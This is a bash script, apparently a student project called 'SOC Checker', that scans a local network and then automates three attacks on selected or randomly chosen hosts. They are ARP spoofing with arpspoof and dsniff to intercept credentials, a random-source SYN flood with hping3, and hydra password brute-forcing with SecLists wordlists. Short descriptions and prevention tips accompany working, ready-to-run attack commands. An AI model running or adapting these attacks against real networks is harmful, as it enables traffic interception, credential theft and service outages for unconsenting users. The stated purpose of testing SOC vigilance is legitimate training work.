#!/bin/bash



#################################
#################################
######## 0.0 Introductions

intro_title() {
	clear
	#echo -e "\e[32m########################\e[0m"
	echo -e "\e[32m########################\e[0m"
	echo -e "\e[32m########################\e[0m"
	echo -e "\e[32mCreated by: S22\n\e[0m"
	echo -e "\e[32mClass code: CFC130623\n\e[0m"
	echo -e "\e[32mLecturer: James\n\e[0m"
	echo -e "\e[32m SSSSS    22222    22222 \e[0m"
	echo -e "\e[32mS        22  22   22   22\e[0m"
	echo -e "\e[32mS           22        22 \e[0m"
	echo -e "\e[32m SSSSS    2222      2222  \e[0m"
	echo -e "\e[32m     S   22        22     \e[0m"
	echo -e "\e[32mSSSSS    222222   222222 \e[0m"
	echo -e "\e[32m\n#### SOC Checker \e[0m"
	echo -e "\e[32m\nThis script will create an automatic attack system that allows SOC managers to check the team's vigilence. You will be presented with multiple attacks and IPs to select for execution. Each selected activity will be saved into a log file in the /var/log directory.\n\nThe script will run in 3 main phases:"
	echo -e "1. Network discovery"
	echo -e "2. Attack selection"
	echo -e "3. Attack execution\e[0m"
}

#################################
#################################
######## Warning to allow sudo
intro_title
echo -e "\nNOTE: This bash script will require sudo priviledges. Kindly key in your password if prompted, else, you may continue."

#################################
#################################
######## 0.1 Initialize sudo & folders

## Create temporary folder based on timestamp and go into the folder
startTime=$(date +'%Y%m%d%H%M%S%Z')
tmpDir="tmp${startTime}"
mkdir "$tmpDir"
cd "$tmpDir"

## Psudo code to trigger sudo authentication
sudo mkdir test

## Initialize a persistent log file in /varlog/ to store the attack details
varlogfile="/var/log/soc-checker-s22"
# Check if the file exists
if [ ! -f "$varlogfile" ]; then
    # If the file does not exist, create it
    sudo touch "$varlogfile" 
    sudo chmod 666 "$varlogfile"
    echo "[INFO] Log file created: $varlogfile"
else
    echo "[INFO] Log file already exists: $varlogfile , new log records will be added from the last line"
fi


#################################
#################################
######## 0.2 Define Basic Functions

## Function get timestamp
getTimestamp() {
	timestamp=$(date +"%Y-%m-%d+%H-%M-%S")
}

## print on display
printfn() {
	echo -e $1
}

printfn_log() {
	sudo echo -e $1 $2 $3 >> "$varlogfile"
}

## function to ask user for input to continue
continueCheck() {
	while true; do
		read -p  "Continue? (y/n) " answer
		# Check the user's response
		if [ "$answer" = "y" ]; then
			break
		elif [ "$answer" = "n" ]; then
			return 1
		else
			echo "Invalid input. Please try again."
		fi
	done
}

removeFiles() {
	printfn "\e[32m########################"
	printfn "You have reached the end of the script. Continue to delete all temporary files. Else, please exit.\e[0m"
	continueCheck
	cd ..
	sudo rm -r "$tmpDir"
}


#################################
#################################
######## 0.3 Check required tools

## record this session in /var/log/soc-checker-s22
getTimestamp
printfn_log "$timestamp" "| [INFO] | New session opened" "| -"

## make sure required packaages are installed
check_nmap=$(sudo which nmap)
check_hping3=$(sudo which hping3)
check_hydra=$(sudo which hydra)
check_seclists=$(sudo which seclists)

# Check if any of the checks returned empty
if [ -z "$check_nmap" ] || [ -z "$check_hping3" ] || [ -z "$check_hydra" ] || [ -z "$check_seclists" ]; then
    echo "[Error] One or more required tools (nmap, hping3, hydra, seclists) not found."
    
    # Prompt the user if it's okay to install the missing tools
    read -p "Do you want to install the missing tools now? (y/n): " install_choice

    if [ "$install_choice" == "y" ]; then
        sudo apt-get install -y nmap hping3 hydra seclists
        
        # Check if any installation failed
        if [ $? -eq 0 ]; then
            echo "[INFO] Installation complete."
        else
            echo "[Error] Installation failed. Exiting..."
            exit 1
        fi
    else
        echo "[INFO] Installation aborted. Exiting..."
        exit 1
    fi
    
else
    echo -e "[INFO] All required tools found.\n"
fi

continueCheck
if [ $? -ne 0 ]; then
	# exit this function back to main menu
	removeFiles
	exit
fi

#################################
#################################
######## 0.4 Scan the network

#### Get the current device IP address
default_hostip=$(hostname -I)

#### Get the default network interface
default_interface=$(ip route | awk '/default/ {print $5}')

#### Extract network range using the default interface
network_cidr=$(ip -o -f inet addr show $default_interface | awk -F' ' '{print $4}')
network_range=$(netmask -r $network_cidr)

intro_networkinfo() {
	printfn "\e[32m\n##### Network Scan\e[0m"
	printfn "\nCurrent Host IP Address: \e[33m$default_hostip\e[0m"
	printfn "Default Interface: \e[33m$default_interface\e[0m"
}

getTimestamp
printfn_log "$timestamp" "| [INFO] | network scan" "| hostip=$default_hostip"

intro_networkinfo
printfn "LAN Network Range:\e[33m$network_range\e[0m"
printfn "\nScanning for IPs in the network ... ... "

#### nmap TCP scan & extract the IP addresses
sudo nmap -sN 172.16.50.51/24 -oX res-nmap-sN-oX > /dev/null
cat res-nmap-sN-oX | grep 'addrtype="ipv4"' | awk -F '"' '{print $2}' > res-nmap-sN-oX-ip
cat res-nmap-sN-oX | grep 'addrtype="mac"' | awk -F '"' '{print $2}' > res-nmap-sN-oX-mac

#### scan and extract the ip addresses
sudo netdiscover -r 172.16.50.51/24 -PN > res-netdiscover
cat res-netdiscover | awk -F " " '{print $1}' > res-netdiscover-ip
cat res-netdiscover | awk -F " " '{print $2}' > res-netdiscover-mac

#### Combine both results and extract the unique values
cat res-nmap-sN-oX-ip >> res-combined-ip
cat res-netdiscover-ip >> res-combined-ip
cat res-combined-ip | grep -oE "\b([0-9]{1,3}\.){3}[0-9]{1,3}\b" | sort | uniq > res-combined-ip-uniq
cat res-combined-ip-uniq | grep -v $default_hostip > res-combined-ip-uniq-new

count_ip=$(cat res-combined-ip-uniq-new | wc -l)

intro_ipsfound() {
	printfn "IP addresses found:"
	printf "\e[38;5;214m"
	cat res-combined-ip-uniq-new
	printf "\e[0m"
}

intro_ipsfound

# Function to display IP addresses
descriptions_file="res-combined-ip-uniq-new"

#################################
#################################
######## 0.5 Define info request functions

#### 0.5.1 Function to display menu
display_menu_ips() {
    echo -e "\nList of target IPS:"
    index=1
    while IFS= read -r description; do
        echo "$index. $description"
        ((index++))
    done < "$descriptions_file"
    echo "0. Exit"
}

#### 0.5.2 Function to gather user input of two target IPs
req_user_two_ips() {
	
	# Ask the user whether to select target IPs or pick them randomly
	printfn " "
	read -p "Do you want to select the target IPs yourself? (y/n): " user_choice

	if [ "$user_choice" == "y" ]; then
		
		# Initialize an array to store numbers
		two_selected_ips=()
		
		## main script
		for i in {1..2}; do
			while true; do
				
				## display the list of IPs in Indexed list
				display_menu_ips
				if [ $? -ne 0 ]; then
					# exit this function back to main menu
					return 1
				fi
				
				## request user input based on Indexes
				if [ $i -eq 1 ]; then
					counter="1st"
				else
					counter="2nd"
				fi
				printfn " "
				read -p "Please select $counter target IP: " choice
				
				## Process the selected choice and display back to the user
				# validate if the user input is not zero and is within the number of total options shown
				if [[ $choice -ge 0 && $choice -le $(wc -l < "$descriptions_file") ]]; then
					if [ $choice -eq 0 ]; then
						echo "Exiting ..."
						return 1
					else
						this_selected_ip=$(sed -n "${choice}p" "$descriptions_file")
						if [ $i -eq 1 ]; then
							choice_IP_1="$this_selected_ip"
						else
							choice_IP_2="$this_selected_ip"
						fi
						break
					fi
				else
					echo "Invalid choice. Please enter a number between 0 and $(wc -l < "$descriptions_file")."
				fi
			done
		done
		
	else
		randomly_pick_target_IP
		choice_IP_1="$selected_ip"
		randomly_pick_target_IP_2
		choice_IP_2="$selected_ip"
	fi

	# echo the user's selection
	printfn "\nYou have selected:"
	printfn "1st target IP:\e[31m $choice_IP_1 \e[0m"
	printfn "2nd target IP:\e[31m $choice_IP_2 \e[0m"
	
}

#### 0.5.3 Function to gather user input of one target IP
req_user_one_ip() {
    # Ask the user whether to select a target IP or pick one randomly
    printfn " "
    read -p "Do you want to select the target IP yourself? (y/n): " user_choice

    if [ "$user_choice" == "y" ]; then
        while true; do
            # Display the list of IPs in an indexed list
            display_menu_ips

            # Request user input based on indexes
            printfn " "
            read -p "Please select the target IP: " choice

            # Process the selected choice and display back to the user
            # Validate if the user input is not zero and is within the number of total options shown
            if [[ $choice -ge 0 && $choice -le $(wc -l < "$descriptions_file") ]]; then
                if [ $choice -eq 0 ]; then
                    echo "Returning to main menu"
                    return 1
                else
                    selected_ip=$(sed -n "${choice}p" "$descriptions_file")
                    break
                fi
            else
                echo "Invalid choice. Please enter a number between 0 and $(wc -l < "$descriptions_file")."
            fi
        done
    else
        randomly_pick_target_IP
    fi

    # Echo the user's selection
    printfn "Target IP:\e[31m $selected_ip \e[0m"
}

#### 0.5.4 Scan the ports based on defined target IP
scan_ports() {

    # Use nmap to scan for open ports
    printfn "Scanning for ports using nmap (timeout=60s) ... ..."
    sudo nmap -p- --host-timeout=20s -Pn "$selected_ip" | grep ^[0-9] | cut -d '/' -f 1 | sed '/^$/d' > open_port_nmap
    
    # usign hping3 to scan for open ports (becuase it seemed to work for the Windows ports)
    printfn "Scanning for ports using hping3 (timeout=60s) ... ..."
    timeout 20s sudo hping3 -S -p 0 --scan 0-65535 "$selected_ip" 2>/dev/null > open_port_hping3_tmp
    cat open_port_hping3_tmp | awk '{print $1}' > open_port_hping3
    
    # join the results and remove duplicates
    touch open_ports
    cat open_port_nmap open_port_hping3 | sort | uniq | grep ^[0-9] > open_ports
	
    if [ ! -s open_ports ]; then
        printfn "No open ports found on $selected_ip."
        return 1
    else
        printfn "\nOpen ports found on $selected_ip:"
        cat open_ports
    fi
}

#### 0.5.5 function to scan ports and display services as well
scan_ports_services() {

    # Use nmap to scan for open ports
    printfn "Scanning for ports and services using nmap (timeout=60s) ... ..."
    sudo nmap -p- --host-timeout=20s -Pn -sV "$selected_ip" > namp_ports_services_tmp_output
    cat namp_ports_services_tmp_output | grep PORT > nmap_ports_services_tmp_headers
    cat namp_ports_services_tmp_output | awk '/^[0-9]/' | sed '/^$/d' > nmap_ports_services_tmp_values
    cat nmap_ports_services_tmp_headers nmap_ports_services_tmp_values > nmap_ports_services_display
	
	#sudo nmap -p- --host-timeout=20s -Pn -sV 172.16.50.20 | awk '/^[0-9]/' | sed '/^$/d'
	#
	
    if [ ! -s nmap_ports_services_tmp_values ]; then
        printfn "No open ports found on $selected_ip."
        return 1
    else
        printfn "\nOpen ports found on $selected_ip:\n"
        cat nmap_ports_services_display
    fi
}

#### 0.5.6 request user to select a port number
req_user_port() {
	printfn " "
	read -p "Select a target port: " selected_ip_port
	printfn "\nTarget IP:\e[31m $selected_ip\e[0m port=\e[31m$selected_ip_port \e[0m"
	continueCheck
}

#### 0.5.7 function for selecting target IP / port at random
randomly_pick_target_IP() {
	randomly_pick_from_list "res-combined-ip-uniq-new"
	selected_ip="$selected_target"
}

randomly_pick_target_IP_2() {
	cat res-combined-ip-uniq-new | grep -v "$selected_ip"
	cat res-combined-ip-uniq-new | grep -v "$selected_ip" > res-combined-ip-uniq-new-2
	randomly_pick_from_list "res-combined-ip-uniq-new-2"
	selected_ip="$selected_target"
}

randomly_pick_target_port() {
	randomly_pick_from_list "res-combined-ip-uniq-new"
	selected_ip_port="$selected_target"
}

randomly_pick_from_list() {
    local numbersFile="$1"
    
    # Check if the file exists
    if [ ! -f "$numbersFile" ]; then
        echo "Error: No IPs found"
        exit 1
    fi

    # Read all numbers from the file into an array
    mapfile -t numbersArray < "$numbersFile"

    # Get the total number of lines in the file
    totalLines=$(wc -l < "$numbersFile")

    # Generate a random index
    randomIndex=$((RANDOM % totalLines))

    # Get the random number from the array
    selected_target="${numbersArray[randomIndex]}"

    # Print the selected random number
    echo "Selected random IP: $selected_target"
}


#### 0.5.7 function for selecting random attack type
randomly_pick_attack() {
    local options=("A" "B" "C")

    # Generate a random index
    randomIndex=$((RANDOM % ${#options[@]}))

    # Get the random option from the array
    randomOption="${options[randomIndex]}"

    # Print the selected random option
    echo "Selected random attack: $randomOption"
    
    case $randomOption in
        A|a)
            getTimestamp
            printfn_log "$timestamp" "| [ARPSPOOF] | attack selected" "| -"
            main_ARPSPOOF
            ;;
        B|b)
            getTimestamp
            printfn_log "$timestamp" "| [DDOS] | attack selected" "| -"
            main_DDOS
            ;;
        C|c)
            getTimestamp
            printfn_log "$timestamp" "| [Password Bruteforce] | attack selected" "| -"
            main_passwordbruteforce
            ;;
    esac
}


#################################
#################################
#################################
######## 1.0 Attack 1 - ARPSPOOF functions

#### Description of attack
display_intro_ARPSPOOF() {
	printfn "\e[32m\n#### You have selected Attack A - [ARSPOOF]"
	printfn "\nARP Spoofing is a cyber attack where falsified Address Resolution Protocol (ARP) messages are sent over a local area network (LAN). The primary goal is to link the attacker's MAC (Media Access Control) address with the IP address of other devices on the network to intercept, modify, or redirect network traffic between two communicating parties."
	printfn "\nThe following attack script will use the [arpspoof] tool to send forged ARP messages containing incorrect MAC address information and claim to be a trusted device. Once the ARP tables on other devices are updated with our MAC address, the network traffic will be redirected through our machine. Next, the [dsniff] tool will is used to intercept and evesdrop on the communication between the two victim devices. Unsecured information such as login credentials or transfered data will be captured."
	printfn "\nPrevention pointers:\n1. Static ARP entries on critical devices\n2. ARP Spoofing detection tools which monitor anomalies\n3. Network segmentation / VLANS to limit the scope of attacks/n4. Secure communication protocols (e.g. HTTPS, SFTP) which encrpts the transimitted data\e[0m"
	printfn "\nYou will be prompted to select 2 target IPs for the attack, or the system will choose a target at random from the IPs found."
}

#### main ARRPSPOOF function

main_ARPSPOOF() {
	
	display_intro_ARPSPOOF
	req_user_two_ips
	if [ $? -ne 0 ]; then
		# exit this function back to main menu
		return 1
	fi
	
	printfn_log "$timestamp" "| [ARPSPOOF] | starting arpspoof attack" "| $choice_IP_1 | $choice_IP_2"
	
	touch arpspoof1.sh
	touch arpspoof2.sh
	echo -e "#!/bin/bash\narpspoof -t $choice_IP_1 $choice_IP_2 2>/dev/null 1>/dev/null &" > arpspoof1.sh
	echo -e "#!/bin/bash\narpspoof -t $choice_IP_2 $choice_IP_1 2>/dev/null 1>/dev/null &" > arpspoof2.sh
	chmod +x arpspoof1.sh
	chmod +x arpspoof2.sh

	printfn "\nExecuting arpspoof from $choice_IP_1 to $choice_IP_2 ... done"
	./arpspoof1.sh &

	printfn "Executing arpspoof from $choice_IP_2 to $choice_IP_1 ... done"
	./arpspoof2.sh &

	printfn "Starting dsniff ..."
	printfn "Note: data passed through unsecured connections will be displayed (e.g. ftp)"
	printfn "\e[32m(Ctrl+C to stop)\e[0m\n"
	sudo dsniff
}

#### [END] (Attack 1 - ARPSPOOF)
#################################

#################################
#################################
#################################
######## 2.0 Attack 2 - hping3 DDOS attack functions

#### Description of attack
display_intro_DDOS() {
	printfn "\e[32m\n#### You have selected Attack B - [DDOS]"
	printfn "\nDDOS (Distributed Denial of Service) attacks are carried out by flooding a target network / service with overwhelming volume of traffic such that it renders it unable to respond to actual requests. When the victim servers are overloaded, it will experience degraded performance or complete unavailability of services and legitimate users may be unable to access it."
	printfn "\nThe following DDOS script will use the [hping3] tool to flood the target IP with TCP SYN messages to overload the network traffic." 
	printfn "\nPrevention points:\n1. Traffic filtering / FIrewall / IPS to identify and block malicious traffic\n2. Network redundancy by distributing network resources across multiple server\n3. Using load balancers to discribute incoming traffic evenly\n4. Rate limiting to restrict the number of requests from a single source\e[0m"
	printfn "\nYou will be prompted to select 1 target IP & Port to execute the attack, or the system will choose a target at random from the IPs found."
}

#### main DDOS function
main_DDOS() {
	display_intro_DDOS
	
	req_user_one_ip
	if [ $? -ne 0 ]; then
		# exit this function back to main menu
		return 1
	fi
	
	scan_ports
	if [ $? -ne 0 ]; then
		# exit this function back to main menu
		return 1
	fi
	
	req_user_port
	if [ $? -ne 0 ]; then
		# exit this function back to main menu
		return 1
	fi
	
	# execute the DDOS attack using hping3
	printfn_log "$timestamp" "| [DDOS] | starting DDOS attack" "| $selected_ip"
	printfn "\nStarting DDOS attack ..."
	printfn "\e[32m(Ctrl+C to stop)\e[0m\n"
	sudo hping3 -c 100000 -d 100000 -S -p "$selected_ip_port" --flood --rand-source "$selected_ip"
}


#### [END] (Attack 2 - hping3 DDOS attack)
#################################

#################################
#################################
#################################
######## 3.0 Attack C - Password Bruteforce functions

display_intro_passwordbruteforce() {
	printfn "\e[32m\n#### You have selected Attack C - [Password Bruteforce]"
	printfn "\nA password bruteforce attack will systematically attempt a list of possible user & password combinations until a correct one is found. The goal is to discover the password through trial and error, as well as exploiting weak passwords which are easily guessable or commonly used. The following script will be using the [hydra] tool to run a the bruteforce attack on a selected port / service. A dictionary of common user names and passwords from the [seclists] tool will be used to increase the likelihood of success."
	printfn "\n Prevention pointers:\n1. Password complexity policies that require combination of uppercase, lowercase, numbers and symbols\n2. Account lockout policies that temporarily lock user accounts after specified number of unsuccessful login attempts\n3. IP whitelisting which allows access only from trusted IP addresses\n4. Monitoring and alerts for suscipious activity such as high volume of failed login attempts\e[0m"
	printfn "\nYou will be prompted to select 1 target IP & port to execute the attack, or the system will choose a target at random from the IPs found."
}

main_passwordbruteforce() {
	
	display_intro_passwordbruteforce
	
	req_user_one_ip
	if [ $? -ne 0 ]; then
		# exit this function back to main menu
		return 1
	fi
	
	scan_ports_services
	if [ $? -ne 0 ]; then
		# exit this function back to main menu
		return 1
	fi
	
    req_user_port
	if [ $? -ne 0 ]; then
		# exit this function back to main menu
		return 1
	fi
	
	selected_protocol=$(cat nmap_ports_services_tmp_values | grep $selected_ip_port | awk '{print $3}')
	usernameFile="/usr/share/seclists/Usernames/top-usernames-shortlist.txt"
	usernameFileCount=$(cat $usernameFile | wc -l)
	passwordFile="/usr/share/seclists/Passwords/xato-net-10-million-passwords-100.txt"
	passwordFileCount=$(cat $passwordFile | wc -l)
		
	# Execute a hydra attack
	printfn_log "$timestamp" "| [Password Bruteforce] | starting password bruteforce attack" "| $selected_ip:$selected_ip_port ($selected_protocol)"
	printfn "\nStarting hydra bruteforce on\e[33m $selected_ip\e[0m port=\e[33m$selected_ip_port\e[0m service=port=\e[33m$selected_protocol\e[0m"
	printfn "Using list of $usernameFileCount usernames from $usernameFile"
	printfn "Using list of $passwordFileCount passwords from $passwordFile"
	sudo hydra -V -L $usernameFile -P $passwordFile $selected_ip $selected_protocol -s $selected_ip_port  
}

#### [END] (password bruteforce)
#################################


#################################
#################################
#################################
#### Main menu

# Function to display the menu
function display_menu_attacks() {
	printfn "\e[32m\n##### Attack selection\e[0m"
    printfn "\nSelect an attack:"
    printfn "\e[33m\nA. [ARPSPOOF]\e[0m\n- a network attack that manipulates ARP messages to redirect and intercept network traffic"
    printfn "\e[33m\nB. [DDOS]\e[0m\n- overwhelm & discrupt a network by flooding with a massive volume of traffic"
    printfn "\e[33m\nC. [Password Bruteforce]\e[0m\n- systematically guess weak or common passwords on a service"
    printfn "\e[33m\nR. Random selection\e[0m"
    printfn "\e[33m\nX. Exit\e[0m\n"
}

# Main script
while true; do
    display_menu_attacks
    read -p "Enter your selection (A/B/C/R/X): " choice

    case $choice in
        A|a)
            getTimestamp
            printfn_log "$timestamp" "| [ARPSPOOF] | attack selected" "| -"
            main_ARPSPOOF
            ;;
        B|b)
            getTimestamp
            printfn_log "$timestamp" "| [DDOS] | attack selected" "| -"
            main_DDOS
            ;;
        C|c)
            getTimestamp
            printfn_log "$timestamp" "| [Password Bruteforce] | attack selected" "| -"
            main_passwordbruteforce
            ;;
        D|d)
            #testing
            printfn "testing testing"
            ;;
        R|r)
			randomly_pick_attack
			;;
        X|x)
			removeFiles
			exit
			;;
        *)
            echo "Invalid selection. Please choose A, B, C, R or X."
            ;;
    esac

	printfn_log "$timestamp" "| [INFO] | attack stopped" "| -"
	printfn " "
	read -p "Do you want to go back to the main menu? (y/n): " continue_choice
    if [ "$continue_choice" != "y" ]; then
		if [ "$continue_choice" == "n" ]; then
			echo "Exiting the script ..."
			removeFiles
			exit 1
		else
			echo "Invalid value. Exiting the script ..."
			removeFiles
			exit 1
		fi
    else
		intro_title
		intro_networkinfo
		intro_ipsfound
    fi

done

#### [END] (main menu)
#################################

#################################
#################################
#################################
## Remove all the temporary files
printfn_log "$timestamp" "| [INFO] | Session closed" "| -"
removeFiles

#### [END] (remove files)
#################################
